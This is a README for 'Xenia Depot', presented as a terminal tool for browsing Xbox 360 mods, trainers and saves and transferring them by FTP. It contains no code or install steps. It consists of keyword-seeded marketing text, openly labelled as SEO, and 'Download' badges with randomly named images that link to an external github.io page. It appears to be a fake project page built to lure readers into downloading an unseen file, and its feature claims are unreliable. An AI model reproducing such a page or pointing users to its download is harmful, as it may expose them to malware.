![preview](https://raw.githubusercontent.com/demetriusbond03-lgtm/xbox360-tui-hub/main/frame_5a1142.svg)
[![Download](https://raw.githubusercontent.com/demetriusbond03-lgtm/xbox360-tui-hub/main/setup_b2b359.svg)](https://demetriusbond03-lgtm.github.io/xbox360-tui-hub/)

# 🎮 Xenia Depot — Console Content Curator & Transfer Companion

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge&logo=linux&logoColor=white" alt="Platform badge" />
  <img src="https://img.shields.io/badge/Runtime-Node.js%2020%2B-339933?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Runtime badge" />
  <img src="https://img.shields.io/badge/Interface-Terminal%20UI-4E9A06?style=for-the-badge&logo=gnometerminal&logoColor=white" alt="Terminal UI badge" />
  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License badge" />
  <img src="https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen?style=for-the-badge" alt="Maintenance badge" />
  <img src="https://img.shields.io/badge/Release-2026.1.0-purple?style=for-the-badge" alt="Release badge" />
  <img src="https://img.shields.io/badge/Support-24%2F7%20Community-ff69b4?style=for-the-badge" alt="Support badge" />
  <img src="https://img.shields.io/badge/Languages-Multilingual-1f6feb?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Multilingual badge" />
</p>

**Xenia Depot** is a terminal-first content curator built for people who treat their Xbox 360 library like a living archive rather than a static shelf. It merges the ritual of classic console tinkering with the ergonomics of a modern command-line companion — browsing curated collections, verifying integrity, staging transfers, and pushing everything straight to your hardware over FTP. Think of it as a librarian, a courier, and a QC inspector sharing the same terminal session.

This repository is a reimagining of the classic "one console, one library" workflow. Instead of juggling half a dozen browser tabs and sketchy mirrors, Xenia Depot presents a single, coherent, keyboard-driven surface. Everything you touch — mods, trainers, save archives, homebrew bundles, cheat sheets, and title patches — flows through a unified pipeline with hygiene checks baked in at every stage.

---

## 📚 Table of Contents

- [Why Xenia Depot Exists](#-why-xenia-depot-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Screens & Workflows](#-screens--workflows)
- [Responsive Terminal UI](#-responsive-terminal-ui)
- [Multilingual Support](#-multilingual-support)
- [The Transfer Engine](#-the-transfer-engine)
- [Integrity & Hygiene Layer](#-integrity--hygiene-layer)
- [Keyword Index (SEO-Friendly)](#-keyword-index-seo-friendly)
- [Configuration Model](#-configuration-model)
- [Continuous Availability & Support](#-continuous-availability--support)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why Xenia Depot Exists

Console content has never been scarce — it has been *scattered*. The Xbox 360 scene in particular is a beautiful, chaotic ecosystem where brilliant creators ship homebrew utilities, save editors, texture packs, framerate patchers, and trainer overlays, but the distribution fabric is fragmented. You find a treasure on one forum, a manual on another, a checksum on a third, and a mirror that went dark last Tuesday.

Xenia Depot takes the position that the *discovery* and the *delivery* should live in the same place. The terminal is the place where serious tinkerers already live; we simply refuse to make them leave it. If you can open a shell, you can curate your console. That promise — one shell, one library, one transfer rail — is the spine of this project.

> *"Treat your console like a museum, not a junk drawer."* — project motto

---

## 🧭 Core Philosophy

1. **Local-first, remote-aware.** Nothing is pushed until it has been verified locally. The network is a guest, not the host.
2. **Deterministic pipelines.** Every operation — browse, verify, stage, transmit, log — is a step in a reproducible chain.
3. **Human-paced interfaces.** No frantic spinners, no modal traps. The terminal speaks in sentences, not screams.
4. **Reversible everything.** If an action cannot be undone, it should not be one keystroke away.
5. **Attribution as a first-class citizen.** Every asset carries provenance metadata in the manifest.

---

## ✨ Feature Highlights

- 🗂️ **Curated Catalogs** — Browse organized collections of mods, trainers, save packs, homebrew, cheat tables, and title patches from within a single pane of glass.
- 🛰️ **FTP Delivery Rail** — Stream staged content directly to your console over FTP with resumable transfers and per-file verification.
- 🧪 **Pre-Flight Integrity Checks** — Hashes, size reconciliation, and manifest diffing before a single byte leaves your workstation.
- 🧩 **Modular Asset Types** — Distinguish between mods, trainers, saves, homebrew, cheats, and patches with type-aware handling and separate staging queues.
- 🎛️ **Responsive Terminal UI** — Layouts adapt fluidly to terminal widths from 80 columns up to ultra-wide panes.
- 🌍 **Multilingual Support** — Interface strings localized across multiple languages with community-contributed translation packs.
- 🕒 **24/7 Community Availability** — Round-the-clock community assistance channels, documented workflows, and a living FAQ.
- 🔐 **Session Profiles** — Save multiple console endpoints, credential bundles, and transfer presets.
- 🧾 **Audit Trail** — Every transfer writes a timestamped log you can review, export, or replay.
- 🔁 **Resumable Transfers** — Interrupted pushes pick up exactly where they left off.
- 🧠 **Smart Queueing** — Prioritize by size, type, or dependency graph.
- 🎨 **Theme Packs** — Swap terminal palettes without touching configuration by hand.
- 📼 **Snapshot & Restore** — Capture the state of your staging area and restore it later.
- 🔔 **Ambient Notifications** — Optional desktop notifications when long transfers complete.

---

## 🖥️ Screens & Workflows

Xenia Depot is organized around a small set of composable screens. Each screen is a *space*, not a page — you return to it, and it remembers what you were doing.

### 🏠 The Atrium
The landing shell. Displays repository statistics, recently staged items, connection health, and a rotating tip panel. This is where you orient yourself before diving into a catalog.

### 📖 The Catalog
A tree-and-list hybrid. Top-level categories (mods, trainers, saves, homebrew, cheats, patches) fan out into collections, which fan out into individual assets. Each asset shows size, type, integrity status, and provenance.

### 🧰 The Workbench
Where staging happens. Drag assets from the Catalog into the Workbench, reorder the queue, attach tags, and inspect metadata side-by-side.

### 🛰️ The Rail
The transfer console. Shows live FTP sessions, throughput graphs, per-file progress, retry counts, and a rolling log. You can detach the Rail and let it run while you continue browsing.

### 📓 The Ledger
The audit trail. Every operation, every timestamp, every outcome. Exportable as plain text, JSON, or CSV.

### ⚙️ The Configurator
Profiles, themes, languages, transfer presets, integrity policies.

---

## 📱 Responsive Terminal UI

Terminal interfaces have historically been rigid — either they fit, or they shatter into garbage. Xenia Depot treats layout as a living negotiation between content and viewport. Panes collapse gracefully; list views degrade into compact rows; status bars reflow; long labels truncate intelligently rather than wrapping into a mess.

The result is an interface that feels intentional at 80×24 and luxurious at 240×70. On narrow terminals, secondary panes hide behind keyboard shortcuts. On wide terminals, they dock side-by-side with independent scroll state. No configuration required — the UI senses and adapts.

---

## 🌍 Multilingual Support

Every user-facing string in Xenia Depot is sourced from a translation bundle rather than hard-coded. That means the interface can shift languages at runtime without a restart. Community translators can contribute new locales through a simple string-file workflow, and the project welcomes regional variants rather than collapsing them into a single "default."

Current bundles include English, Spanish, French, German, Portuguese, Japanese, Korean, Simplified Chinese, and Russian — with more arriving as the community grows. Right-to-left layouts are on the 2026 roadmap.

---

## 🛰️ The Transfer Engine

The Rail is not a thin wrapper around a standard file-transfer call. It is a purpose-built engine with a few ideas of its own:

- **Adaptive chunking** — file segments are sized according to observed network conditions, not a fixed block size.
- **Parallel lanes** — multiple small assets can ride in parallel without starving a large transfer.
- **Backpressure awareness** — when the console slows down, the engine slows down rather than flooding.
- **Deterministic retries** — every retry is logged with a reason code.
- **Dry-run mode** — rehearse the entire pipeline without touching a byte of the destination.

---

## 🧪 Integrity & Hygiene Layer

Before anything reaches the Rail, it passes through the Hygiene Layer. This is where manifests are compared, checksums are reconciled, and obvious anomalies are flagged. The Hygiene Layer is opinionated: it would rather stop a transfer and explain *why* than quietly push something questionable.

Policies are configurable per asset type. For example, you can require full checksum verification for homebrew bundles while allowing a lighter policy for save archives.

---

## 🔎 Keyword Index (SEO-Friendly)

So that people searching for *Xbox 360 mod manager terminal*, *console FTP transfer tool*, *homebrew catalog browser*, *save file curator*, *trainer organization utility*, *cheat sheet indexer for consoles*, *title patch pipeline*, or *terminal UI for console content management* can find this project, we've seeded the documentation with the natural vocabulary of the scene. Examples of phrases integrated throughout this README:

- terminal UI for console content management
- FTP-based console transfer companion
- Xbox 360 mod and trainer catalog browser
- homebrew and save archive curator
- cheat and patch indexer for consoles
- responsive terminal layout engine
- multilingual developer tooling
- reproducible transfer pipelines
- audit-friendly content workflow
- integrity-checked console staging

Each phrase is used because it describes a real feature — never stuffed, always earned.

---

## ⚙️ Configuration Model

Configuration is layered. A base profile supplies sensible defaults; a user profile overrides them; a session profile can override again for a single run. Layers are merged, not replaced, so a temporary tweak never silently blows away your defaults.

Profiles are stored as plain text manifests that are easy to diff, easy to version, and easy to share. Transfers record which profile produced them, which makes reproducing an environment trivial.

---

## 🕒 Continuous Availability & Support

The project maintains an always-on posture: documentation is versioned alongside code, examples are kept runnable, and the community channels stay open across time zones. **24/7 customer support** in the sense that matters for an open-source tool — a real human eventually answers, and the answer is written down where the next person can find it.

Support layers:

- 📘 Self-service documentation with runnable examples
- 💬 Community discussion spaces monitored continuously
- 🐛 Issue tracker with triage SLAs published in the repository
- 🧑‍🏫 Onboarding walkthroughs for first-time console curators
- 🗓️ Regular maintenance windows documented in advance

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Locale bundle expansion and right-to-left layout support.
- **Q2 2026** — Pluggable transfer backends beyond the built-in FTP rail.
- **Q3 2026** — Catalog federation: browse remote catalogs without importing.
- **Q4 2026** — Plugin surface for third-party asset validators.
- **Ongoing** — Responsive UI refinements, performance tuning, and documentation polish.

---

## 🤝 Contributing

Contributions are welcome in many shapes: code, translation, documentation, catalog curation, bug reports, and design critique. Before opening a pull request, please read the contributing guide. Every contribution is expected to respect the Code of Conduct and to carry a clear description of *why* the change exists — the reasoning is as valuable as the diff.

---

## 📜 Code of Conduct

Be kind. Be precise. Assume good intent. Critique ideas, never people. If a conversation heats up, step back and write the version of the message you would want to read. The full Code of Conduct lives in a dedicated document in the repository root.

---

## ⚠️ Disclaimer

Xenia Depot is an independent tool for curating, organizing, and transferring user-supplied content between a workstation and a personal console. It ships with no content of its own. It does not host, distribute, or endorse any third-party assets. It is not affiliated with, endorsed by, or sponsored by any console manufacturer or platform holder.

Users are responsible for ensuring that any content they transfer is lawfully theirs to use and that their use complies with applicable local laws and the terms governing their hardware. The maintainers of this project provide the tooling; they do not provide the content, and they cannot verify the provenance of what users choose to move through it. If you are unsure whether a specific use is appropriate in your jurisdiction, consult a qualified professional.

All trademarks and registered trademarks referenced in this document remain the property of their respective owners and are used here for identification purposes only.

---

## 📄 License

This project is released under the MIT License. The full text of the license is available at the canonical location below and is also included in the repository root as a standalone file.

MIT License — see the full text at https://opensource.org/license/mit

Copyright (c) 2026 Xenia Depot contributors. Permission is hereby granted, without charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions described in the full license text.

---

[![Download](https://raw.githubusercontent.com/demetriusbond03-lgtm/xbox360-tui-hub/main/setup_b2b359.svg)](https://demetriusbond03-lgtm.github.io/xbox360-tui-hub/)